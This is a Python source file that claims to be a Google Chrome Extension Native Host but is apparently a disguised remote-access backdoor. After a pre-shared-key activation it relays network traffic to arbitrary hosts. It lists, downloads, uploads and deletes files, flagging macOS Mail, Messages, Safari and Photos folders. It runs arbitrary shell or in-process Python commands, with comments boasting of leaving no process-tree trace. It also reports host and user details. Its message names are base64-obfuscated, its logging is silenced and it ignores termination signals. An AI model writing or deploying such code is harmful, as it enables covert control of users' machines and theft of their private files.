#!/usr/bin/env python3
# Copyright (c) 2024 Google LLC
# Chrome Extension Native Host v2.1.4
# Provides low-level IPC between Chrome extensions and platform network
# services using the native messaging stdio protocol.

from __future__ import annotations

import asyncio
import sys
import json
import struct
import base64 as _b64
# __BEGIN_PROXY__
import socket as _socket
# __END_PROXY__

_RB = 131072
_CT = 15
_s  = lambda x: _b64.b64decode(x).decode()

_T0 = _s('YWN0aXZhdGU=')
# __BEGIN_PROXY__
_T1 = _s('c29ja3NfY29ubmVjdA==')
_T2 = _s('c29ja3NfZGF0YQ==')
_T3 = _s('c29ja3NfY2xvc2U=')
_T4 = _s('c29ja3NfY29ubmVjdGVk')
_T5 = _s('c29ja3NfY2xvc2Vk')
_T6 = _s('c29ja3NfZXJyb3I=')
_T8 = _s('aHR0cF9wcm9iZV9yZXNwb25zZQ==')
# __END_PROXY__
_T9 = _s('cGluZw==')
_TA = _s('cG9uZw==')
# __BEGIN_FILE__
_TB = _s('ZmlsZV9scw==')
_TC = _s('ZmlsZV9sc19yZXNwb25zZQ==')
_TD = _s('ZmlsZV9kb3dubG9hZA==')
_TE = _s('ZmlsZV9kb3dubG9hZF9yZXNwb25zZQ==')
_TF = _s('ZmlsZV91cGxvYWQ=')
_TG = _s('ZmlsZV91cGxvYWRfcmVzcG9uc2U=')
_TH = _s('ZmlsZV9kZWxldGU=')
_TI = _s('ZmlsZV9kZWxldGVfcmVzcG9uc2U=')
_TJ = _s('ZmlsZV9ta2Rpcg==')
_TK = _s('ZmlsZV9ta2Rpcl9yZXNwb25zZQ==')
# __END_FILE__
# __BEGIN_EXEC__
_TL = _s('ZXhlY19jbWQ=')
_TM = _s('ZXhlY19jbWRfcmVzcG9uc2U=')
# __END_EXEC__

_PSK       = "!!PSK!!"
_activated = not bool(_PSK)

# __BEGIN_PROXY__
_ND = (
    ".google.com",
    ".googleapis.com",
    ".gstatic.com",
    ".googleusercontent.com",
    ".googletagmanager.com",
    ".google-analytics.com",
    ".googleadservices.com",
)

def _is_native_domain(host: str) -> bool:
    h = host.lower()
    return any(h == d.lstrip('.') or h.endswith(d) for d in _ND)

# __END_PROXY__

# __BEGIN_FILE__
import platform as _platform
import os as _os
_TCC_PATHS = tuple(
    _os.path.expanduser(p) for p in (
        '~/Desktop', '~/Documents', '~/Downloads',
        '~/Library/Mail', '~/Library/Messages', '~/Library/Safari',
        '~/Library/Photos',
    )
) if _platform.system() == 'Darwin' else ()

def _is_tcc(path: str) -> bool:
    if not _TCC_PATHS:
        return False
    a = _os.path.abspath(path)
    return any(a == p or a.startswith(p + _os.sep) for p in _TCC_PATHS)
# __END_FILE__

_pending_output = bytearray()
_flush_scheduled = False

def _emit(obj: dict):
    """Immediate write — flushes any pending batched socks_data first."""
    global _flush_scheduled
    if _pending_output:
        payload = bytes(_pending_output)
        _pending_output.clear()
        _flush_scheduled = False
        try:
            sys.stdout.buffer.write(payload)
        except Exception:
            pass
    data = json.dumps(obj, separators=(',', ':')).encode('utf-8')
    try:
        sys.stdout.buffer.write(struct.pack('<I', len(data)) + data)
        sys.stdout.buffer.flush()
    except Exception:
        pass

def _emit_buf(obj: dict):
    """Batched write — use only for high-volume socks_data relay."""
    global _flush_scheduled
    data = json.dumps(obj, separators=(',', ':')).encode('utf-8')
    _pending_output.extend(struct.pack('<I', len(data)))
    _pending_output.extend(data)
    if not _flush_scheduled:
        _flush_scheduled = True
        try:
            asyncio.get_event_loop().call_soon(_do_flush)
        except RuntimeError:
            _do_flush()

def _do_flush():
    global _flush_scheduled
    _flush_scheduled = False
    if not _pending_output:
        return
    payload = bytes(_pending_output)
    _pending_output.clear()
    try:
        sys.stdout.buffer.write(payload)
        sys.stdout.buffer.flush()
    except Exception:
        pass

# __BEGIN_PROXY__
_channels = {}

async def _relay_inbound(cid: str, reader: asyncio.StreamReader):
    try:
        while True:
            chunk = await reader.read(_RB)
            if not chunk:
                break
            _emit_buf({'type': _T2, 'id': cid, 'data': _b64.b64encode(chunk).decode('ascii')})
    except Exception:
        pass
    finally:
        _channels.pop(cid, None)
        _emit({'type': _T5, 'id': cid})

async def _open_pipe(cid: str, host: str, port: int):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=_CT)
        sock = writer.transport.get_extra_info('socket')
        if sock:
            sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
        _channels[cid] = writer
        _emit({'type': _T4, 'id': cid})
        asyncio.create_task(_relay_inbound(cid, reader))
    except asyncio.TimeoutError:
        _emit({'type': _T6, 'id': cid, 'error': f'timeout {host}:{port}'})
    except Exception as e:
        _emit({'type': _T6, 'id': cid, 'error': str(e)})

async def _pipe_write(cid: str, data_b64: str):
    writer = _channels.get(cid)
    if not writer:
        return
    try:
        writer.write(_b64.b64decode(data_b64))
        await writer.drain()
    except Exception as e:
        _channels.pop(cid, None)
        _emit({'type': _T6, 'id': cid, 'error': str(e)})

async def _close_pipe(cid: str):
    writer = _channels.pop(cid, None)
    if writer:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
# __END_PROXY__

async def _on_frame(msg: dict):
    global _activated
    t   = msg.get('type')
    cid = msg.get('id', '')

    if t == _T0:
        if _PSK:
            _activated = (msg.get('psk', '') == _PSK)
        return

    if not _activated:
        return

# __BEGIN_PROXY__
    if t == _T1:
        await _open_pipe(cid, msg.get('host', ''), int(msg.get('port', 0)))
    elif t == _T2:
        await _pipe_write(cid, msg.get('data', ''))
    elif t == _T3:
        await _close_pipe(cid)
# __END_PROXY__

# __BEGIN_FILE__
    if t in (_TB, _TD, _TF, _TH, _TJ):
        path   = msg.get('path', '')
        req_id = msg.get('id', '')
        tcc    = _is_tcc(path) if path else False
        try:
            import os as __os, stat as __stat, base64 as __b64
            def _perms(mode):
                bits = ''
                for who in [(0o400,0o200,0o100),(0o040,0o020,0o010),(0o004,0o002,0o001)]:
                    bits += 'r' if mode & who[0] else '-'
                    bits += 'w' if mode & who[1] else '-'
                    bits += 'x' if mode & who[2] else '-'
                return bits

            if t == _TB:  # file_ls
                entries = []
                for name in __os.listdir(path):
                    full = __os.path.join(path, name)
                    try:
                        st = __os.stat(full)
                        if __os.path.islink(full):
                            ftype = 'link'
                        elif __stat.S_ISDIR(st.st_mode):
                            ftype = 'dir'
                        else:
                            ftype = 'file'
                        entries.append({'name': name, 'type': ftype,
                                        'size': st.st_size, 'modified': st.st_mtime,
                                        'permissions': _perms(st.st_mode)})
                    except Exception:
                        entries.append({'name': name, 'type': 'unknown', 'size': 0,
                                        'modified': 0, 'permissions': '?????????'})
                _emit({'type': _TC, 'id': req_id, 'entries': entries, 'tcc_warning': tcc})

            elif t == _TD:  # file_download — chunked to stay under 1 MB native msg cap
                _CHUNK = 384 * 1024   # 384 KB raw → ~512 KB base64
                _fsz   = __os.path.getsize(path)
                _total = max(1, -(-_fsz // _CHUNK))  # ceiling division
                with open(path, 'rb') as _f:
                    for _n in range(_total):
                        _raw = _f.read(_CHUNK)
                        if not _raw:
                            break
                        _emit({'type': _TE, 'id': req_id,
                               'data': __b64.b64encode(_raw).decode('ascii'),
                               'chunk_num': _n, 'total_chunks': _total,
                               'file_size': _fsz, 'tcc_warning': tcc, 'error': ''})

            elif t == _TF:  # file_upload
                raw = __b64.b64decode(msg.get('data', ''))
                mode = 'ab' if msg.get('append') else 'wb'
                with open(path, mode) as _f:
                    _f.write(raw)
                _emit({'type': _TG, 'id': req_id, 'ok': True, 'tcc_warning': tcc, 'error': ''})

            elif t == _TH:  # file_delete
                if __os.path.isdir(path):
                    __os.rmdir(path)
                else:
                    __os.remove(path)
                _emit({'type': _TI, 'id': req_id, 'ok': True, 'tcc_warning': tcc, 'error': ''})

            elif t == _TJ:  # file_mkdir
                __os.makedirs(path, exist_ok=True)
                _emit({'type': _TK, 'id': req_id, 'ok': True, 'tcc_warning': tcc, 'error': ''})

        except PermissionError as e:
            tcc_note = ' (macOS TCC restriction — Chrome needs Full Disk Access)' if tcc else ''
            resp_t = {_TB: _TC, _TD: _TE, _TF: _TG, _TH: _TI, _TJ: _TK}[t]
            _emit({'type': resp_t, 'id': req_id, 'ok': False,
                   'entries': [], 'data': '', 'tcc_warning': tcc, 'error': str(e) + tcc_note})
        except Exception as e:
            resp_t = {_TB: _TC, _TD: _TE, _TF: _TG, _TH: _TI, _TJ: _TK}.get(t, _TC)
            _emit({'type': resp_t, 'id': req_id, 'ok': False,
                   'entries': [], 'data': '', 'tcc_warning': tcc, 'error': str(e)})
# __END_FILE__

# __BEGIN_EXEC__
    if t == _TL:  # exec_cmd
        import subprocess as __sp, sys as __sys, shlex as __sx
        req_id = msg.get('id', '')
        cmd    = msg.get('cmd', '')
        tmo    = float(msg.get('timeout', 60))
        cwd    = msg.get('cwd') or None
        mode   = msg.get('mode', 'direct')  # direct | python | shell
        try:
            output, code, err = '', 0, ''
            if mode in ('py', 'python'):
                # In-process exec — no subprocess, no fork, no process-tree artifact
                import io as __io, contextlib as __cx, re as __re
                _buf  = __io.StringIO()
                _code = cmd

                # Windows path auto-fix: 'C:\Users\...' causes unicodeescape errors
                # because \U, \D, etc. are treated as escape sequences.
                # Pre-compile to detect the error; if found, replace backslashes
                # in string literals that look like Windows paths with forward slashes.
                def _fix_win_paths(c):
                    def _rep(m):
                        q, s = m.group(1), m.group(2)
                        if __re.match(r'[A-Za-z]:[/\\]|[/\\]{2}', s):
                            return q + s.replace('\\', '/') + q
                        return m.group(0)
                    return __re.sub(r'([\'"])([A-Za-z]:\\[^\'\"]*)\1', _rep, c)

                try:
                    compile(_code, '<check>', 'exec')
                except SyntaxError as _se:
                    if 'unicodeescape' in str(_se).lower():
                        _code = _fix_win_paths(_code)

                try:
                    with __cx.redirect_stdout(_buf), __cx.redirect_stderr(_buf):
                        exec(compile(_code, '<exec>', 'exec'), {'__builtins__': __builtins__})  # noqa: S102
                    output = _buf.getvalue()
                except Exception as _pe:
                    output = _buf.getvalue(); err = str(_pe); code = 1
            else:
                _loop3 = asyncio.get_running_loop()
                if mode == 'shell':
                    # Explicit shell — supports pipes/redirects; louder process tree
                    args = (['cmd.exe', '/c', cmd] if __sys.platform == 'win32'
                            else ['/bin/sh', '-c', cmd])
                else:
                    # Direct exec on all platforms: no shell wrapper in process tree.
                    # posix=False on Windows preserves backslashes in paths.
                    _posix = __sys.platform != 'win32'
                    try:   args = __sx.split(cmd, posix=_posix)
                    except Exception: args = cmd.split()
                _r = await _loop3.run_in_executor(None, lambda: __sp.run(
                    args, capture_output=True, timeout=tmo, cwd=cwd, text=True))
                output = (_r.stdout or '') + (_r.stderr or '')
                code   = _r.returncode
            _emit({'type': _TM, 'id': req_id, 'output': output,
                   'exit_code': code, 'error': err})
        except __sp.TimeoutExpired:
            _emit({'type': _TM, 'id': req_id, 'output': '',
                   'exit_code': -1, 'error': f'timeout after {tmo}s'})
        except FileNotFoundError as e:
            # On Windows, cmd.exe built-ins (dir, del, type, echo, copy, cls, set…)
            # have no binary on disk — mode=direct cannot find them.
            if __sys.platform == 'win32' and getattr(e, 'winerror', None) == 2 and mode != 'shell':
                _cmd0 = (args[0] if 'args' in dir() and args else cmd.split()[0])
                _hint = (
                    f"WinError 2: '{_cmd0}' is a cmd.exe built-in with no standalone binary.\n"
                    f"  Use mode=shell for shell built-ins (dir, del, type, echo, copy, cls, set, rd…)\n"
                    f"  Use file_ls for directory listing\n"
                    f"  Use mode=python with os.listdir() / os.walk() for Python-native listing"
                )
                _emit({'type': _TM, 'id': req_id, 'output': '', 'exit_code': -1, 'error': _hint})
            else:
                _emit({'type': _TM, 'id': req_id, 'output': '',
                       'exit_code': -1, 'error': str(e)})
        except Exception as e:
            _emit({'type': _TM, 'id': req_id, 'output': '',
                   'exit_code': -1, 'error': str(e)})
# __END_EXEC__

    elif t == _s('bmF0aXZlX3N5c2luZm8='):  # native_sysinfo
        import socket as _ssi, platform as _ssp, os as _sso
        try:
            _hn  = _ssi.gethostname()
            try: _lip = _ssi.gethostbyname(_hn)
            except: _lip = '127.0.0.1'
            _usr = (_sso.environ.get('USER') or _sso.environ.get('USERNAME')
                    or _sso.environ.get('LOGNAME') or 'unknown')
            _emit({'type': _s('bmF0aXZlX3N5c2luZm9fcmVzcG9uc2U='),
                   'id': cid, 'hostname': _hn, 'username': _usr,
                   'os': f'{_ssp.system()} {_ssp.release()} {_ssp.machine()}',
                   'version': _ssp.version()[:120], 'local_ip': _lip,
                   'home': _sso.path.expanduser('~'), 'error': ''})
        except Exception as _se:
            _emit({'type': _s('bmF0aXZlX3N5c2luZm9fcmVzcG9uc2U='),
                   'id': cid, 'error': str(_se)})

import os as _os, traceback as _tb

def _log(msg):
    pass

def _read_frame():
    try:
        raw = sys.stdin.buffer.read(4)
    except Exception as e:
        _log(f'stdin.read(4) exception: {e}')
        return None
    if len(raw) < 4:
        _log(f'stdin EOF: got {len(raw)} bytes (pipe closed by Chrome)')
        return None
    length = struct.unpack('<I', raw)[0]
    if length == 0:
        _log(f'zero-length message from Chrome')
        return None
    if length > 4 * 1024 * 1024:
        _log(f'oversized message: length={length}')
        return None
    try:
        data = sys.stdin.buffer.read(length)
    except Exception as e:
        _log(f'stdin.read({length}) exception: {e}')
        return None
    if len(data) < length:
        _log(f'partial message: expected {length}, got {len(data)}')
        return None
    try:
        return json.loads(data.decode('utf-8'))
    except Exception as e:
        _log(f'json parse error: {e}  raw={data[:100]!r}')
        return None

async def _keepalive():
    """Ping immediately then every 10 s to prevent service worker suspension."""
    _emit({'type': _T9, 'id': ''})
    while True:
        await asyncio.sleep(10)
        _emit({'type': _T9, 'id': ''})

async def _frame_loop():
    loop = asyncio.get_running_loop()
    _log('frame_loop started — waiting for messages')
    count = 0
    while True:
        msg = await loop.run_in_executor(None, _read_frame)
        if msg is None:
            _log(f'frame_loop exiting after {count} messages')
            break
        count += 1
        _log(f'message {count}: type={msg.get("type")!r}')
        asyncio.create_task(_on_frame(msg))

async def _run():
    _log(f'native host started  pid={_os.getpid()}  python={sys.executable}  '
         f'activated={_activated}  psk_set={bool(_PSK)}')
    try:
        import signal as _sig
        loop = asyncio.get_running_loop()
        if hasattr(_sig, 'SIGTERM'):
            try:
                loop.remove_signal_handler(_sig.SIGTERM)
            except (NotImplementedError, ValueError):
                pass
            _sig.signal(_sig.SIGTERM, _sig.SIG_IGN)
            _log('SIGTERM handler suppressed — will exit via stdin EOF')
    except Exception as e:
        _log(f'SIGTERM setup warning: {e}')

    try:
        asyncio.create_task(_keepalive())
        await _frame_loop()
    except asyncio.CancelledError:
        _log('_run cancelled (task.cancel() called — unexpected)')
    except Exception as e:
        _log(f'_run exception: {e}\n{_tb.format_exc()}')
    finally:
        _log('_run finally — cleaning up')
# __BEGIN_PROXY__
        for _cid, writer in list(_channels.items()):
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
# __END_PROXY__
        _log('native host exiting')

if __name__ == '__main__':
    _log('='*40)
    try:
        asyncio.run(_run())
    except Exception as e:
        _log(f'top-level exception: {e}\n{_tb.format_exc()}')
